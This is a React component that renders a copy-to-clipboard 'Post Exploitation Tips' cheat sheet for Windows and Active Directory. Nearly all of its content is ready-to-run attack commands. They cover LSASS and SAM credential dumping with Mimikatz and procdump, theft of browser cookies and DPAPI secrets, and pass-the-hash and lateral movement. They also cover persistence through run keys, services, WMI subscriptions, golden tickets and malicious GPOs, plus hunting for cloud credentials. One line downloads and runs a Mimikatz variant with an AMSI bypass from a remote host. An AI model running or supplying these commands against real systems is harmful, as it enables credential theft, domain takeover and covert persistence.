import { useState } from 'react';
import { motion } from 'framer-motion';
import { FaChevronDown, FaUserShield, FaInfoCircle } from 'react-icons/fa';
import ReactMarkdown from 'react-markdown';
import { copyToClipboard } from '../../utils/copyToClipboard';
import { toast } from 'react-toastify';

const PostExploitation = () => {
  const [expandedSection, setExpandedSection] = useState('credential');

  const toggleSection = (section) => {
    setExpandedSection(expandedSection === section ? null : section);
  };

  const handleCopy = (command) => {
    copyToClipboard(command);
    toast.success('Command copied to clipboard!');
  };

  const sections = [
    {
      id: 'credential',
      title: 'Credential Dumping',
      content: [
        {
          type: 'markdown',
          value: `### LSASS Dumping
\`\`\`powershell
# Procdump method
procdump.exe -accepteula -ma lsass.exe lsass.dmp

# Mimikatz
Invoke-Mimikatz -Command '"sekurlsa::logonpasswords"'

# Comsvcs.dll
rundll32.exe C:\\windows\\System32\\comsvcs.dll MiniDump <PID> lsass.dmp full

# SafetyKatz (Mimikatz + AMSI bypass)
IEX(New-Object Net.WebClient).DownloadString('http://10.0.0.1/SafetyKatz.ps1'); Invoke-SafetyKatz -Command '"sekurlsa::logonpasswords"'
\`\`\``
        },
        {
          type: 'markdown',
          value: `### SAM & LSA Secrets
\`\`\`powershell
# Registry dump method
reg save HKLM\\SAM sam.save
reg save HKLM\\SYSTEM system.save
reg save HKLM\\SECURITY security.save

# Secretsdump.py (Impacket)
python3 secretsdump.py -sam sam.save -system system.save -security security.save LOCAL

# LSA Secrets with Mimikatz
Invoke-Mimikatz -Command '"lsadump::secrets"'
\`\`\``
        },
        {
          type: 'markdown',
          value: `### DPAPI & Vault
\`\`\`powershell
# Chrome cookies/credentials
.\SharpChrome.exe cookies /exportjson:creds.json
.\SharpChrome.exe logins /exportjson:creds.json

# DPAPI master keys
Invoke-Mimikatz -Command '"sekurlsa::dpapi"'
.\SharpDPAPI.exe /mkfile:masterkeys.txt

# Windows Vault
.\SharpVault.exe --unprotect
\`\`\``
        }
      ]
    },
    {
      id: 'lateral',
      title: 'Lateral Movement',
      content: [
        {
          type: 'markdown',
          value: `### Common Techniques
\`\`\`powershell
# WMI Execution
Invoke-WmiMethod -Path Win32_Process -Name Create -ArgumentList "cmd.exe /c whoami" -ComputerName TARGET

# PowerShell Remoting
Enter-PSSession -ComputerName TARGET -Credential (Get-Credential)

# Scheduled Tasks
schtasks /create /s TARGET /tn "Update" /tr "cmd.exe /c C:\\temp\\payload.exe" /sc once /st 00:00 /ru SYSTEM
schtasks /run /s TARGET /tn "Update"

# DCOM Execution
$com = [activator]::CreateInstance([type]::GetTypeFromProgID("MMC20.Application","TARGET"))
$com.Document.ActiveView.ExecuteShellCommand("cmd.exe",$null,"/c whoami","7")
\`\`\``
        },
        {
          type: 'markdown',
          value: `### Pass-the-Hash
\`\`\`powershell
# Mimikatz
Invoke-Mimikatz -Command '"sekurlsa::pth /user:Administrator /domain:CONTOSO /ntlm:HASH /run:cmd.exe"'

# Rubeus
.\Rubeus.exe asktgt /user:Administrator /domain:CONTOSO /rc4:HASH /ptt

# CrackMapExec
crackmapexec smb TARGET -u Administrator -H HASH -x whoami
\`\`\``
        }
      ]
    },
    {
      id: 'persistence',
      title: 'Persistence',
      content: [
        {
          type: 'markdown',
          value: `### Common Methods
\`\`\`powershell
# Registry Run Keys
reg add "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run" /v Backdoor /t REG_SZ /d "C:\\temp\\payload.exe" /f

# Scheduled Tasks
schtasks /create /tn "Cleanup" /tr "C:\\temp\\payload.exe" /sc daily /st 09:00 /ru SYSTEM

# Services
sc.exe create "WindowsUpdate" binPath= "C:\\temp\\payload.exe" start= auto
sc.exe start "WindowsUpdate"

# WMI Event Subscription
$filterArgs = @{name='UpdateFilter'; EventNameSpace='root\\cimv2'; QueryLanguage="WQL"; Query="SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System'"}; $filter=New-CimInstance -Namespace root/subscription -ClassName __EventFilter -Property $filterArgs
$consumerArgs = @{name='UpdateConsumer'; CommandLineTemplate="C:\\temp\\payload.exe"}; $consumer=New-CimInstance -Namespace root/subscription -ClassName CommandLineEventConsumer -Property $consumerArgs
$bindingArgs = @{Filter=[Ref] $filter; Consumer=[Ref] $consumer}; $binding=New-CimInstance -Namespace root/subscription -ClassName __FilterToConsumerBinding -Property $bindingArgs
\`\`\``
        },
        {
          type: 'markdown',
          value: `### Domain Persistence
\`\`\`powershell
# Golden Ticket
Invoke-Mimikatz -Command '"kerberos::golden /user:Administrator /domain:CONTOSO /sid:S-1-5-21-123456789 /krbtgt:HASH /ptt"'

# DCShadow
Invoke-Mimikatz -Command '"lsadump::dcshadow /object:CN=User,CN=Users,DC=contoso,DC=com /attribute:Description /value:Hacked"'

# Malicious GPO
New-GPO -Name "Legit Update" | New-GPLink -Target "DC=contoso,DC=com"
Set-GPPrefRegistryValue -Name "Legit Update" -Context Computer -Key "HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run" -ValueName "Update" -Value "cmd.exe /c C:\\temp\\backdoor.exe" -Type ExpandString
\`\`\``
        }
      ]
    },
    {
      id: 'data',
      title: 'Data Hunting',
      content: [
        {
          type: 'markdown',
          value: `### Sensitive Files
\`\`\`powershell
# Find files with keywords
findstr /si password *.txt *.xml *.ini *.config
Select-String -Path "*.txt","*.xml","*.ini","*.config" -Pattern "password","secret","key"

# Common locations
C:\\Users\\*\\AppData\\Roaming\\*\\config.json
C:\\Program Files (x86)\\*\\conf\\*.properties
C:\\inetpub\\wwwroot\\web.config
\`\`\``
        },
        {
          type: 'markdown',
          value: `### Cloud Credentials
\`\`\`powershell
# AWS
Get-ChildItem -Path C:\\Users\\ -Filter *.aws\\credentials -Recurse -ErrorAction SilentlyContinue
Get-ChildItem -Path C:\\Users\\ -Filter *aws_access_key_id* -Recurse -ErrorAction SilentlyContinue

# Azure
Get-ChildItem -Path C:\\Users\\ -Filter *.azure\\accessTokens.json -Recurse -ErrorAction SilentlyContinue
Get-ChildItem -Path C:\\Users\\ -Filter *azureProfile.json -Recurse -ErrorAction SilentlyContinue

# GCP
Get-ChildItem -Path C:\\Users\\ -Filter *.config\\gcloud\\credentials.db -Recurse -ErrorAction SilentlyContinue
\`\`\``
        }
      ]
    }
  ];

  return (
    <div className="cheatsheet-container">
      <h2 className="cheatsheet-title">
        <FaUserShield /> Post Exploitation Tips
      </h2>
      
      <div className="info-banner">
        <FaInfoCircle />
        <p>
          Comprehensive guide to post-exploitation techniques including credential dumping,
          lateral movement, persistence, and data hunting. Covers both Windows and Active Directory environments.
        </p>
      </div>
      
      <div className="sections-container">
        {sections.map((section) => (
          <div key={section.id} className="section">
            <motion.div
              className="section-header"
              onClick={() => toggleSection(section.id)}
              whileHover={{ scale: 1.02 }}
              whileTap={{ scale: 0.98 }}
            >
              <h3>{section.title}</h3>
              <motion.div
                animate={{ rotate: expandedSection === section.id ? 180 : 0 }}
              >
                <FaChevronDown />
              </motion.div>
            </motion.div>
            
            <motion.div
              className="section-content"
              initial={{ opacity: 0, height: 0 }}
              animate={{
                opacity: expandedSection === section.id ? 1 : 0,
                height: expandedSection === section.id ? 'auto' : 0
              }}
              transition={{ duration: 0.3 }}
            >
              {expandedSection === section.id && (
                <div className="content-inner">
                  {section.content.map((item, index) => (
                    <div key={index} className="content-item">
                      {item.type === 'command' ? (
                        <div className="command-item">
                          <div className="command-header">
                            <code>{item.value}</code>
                            <button
                              onClick={() => handleCopy(item.value)}
                              className="copy-button small"
                            >
                              Copy
                            </button>
                          </div>
                          <p className="command-description">{item.description}</p>
                        </div>
                      ) : (
                        <div className="markdown-content">
                          <ReactMarkdown>
                            {item.value}
                          </ReactMarkdown>
                          <button
                            onClick={() => handleCopy(item.value.replace(/```[a-z]*\n/, '').replace(/\n```/, ''))}
                            className="copy-button"
                          >
                            Copy All
                          </button>
                        </div>
                      )}
                    </div>
                  ))}
                </div>
              )}
            </motion.div>
          </div>
        ))}
      </div>
    </div>
  );
};

export default PostExploitation;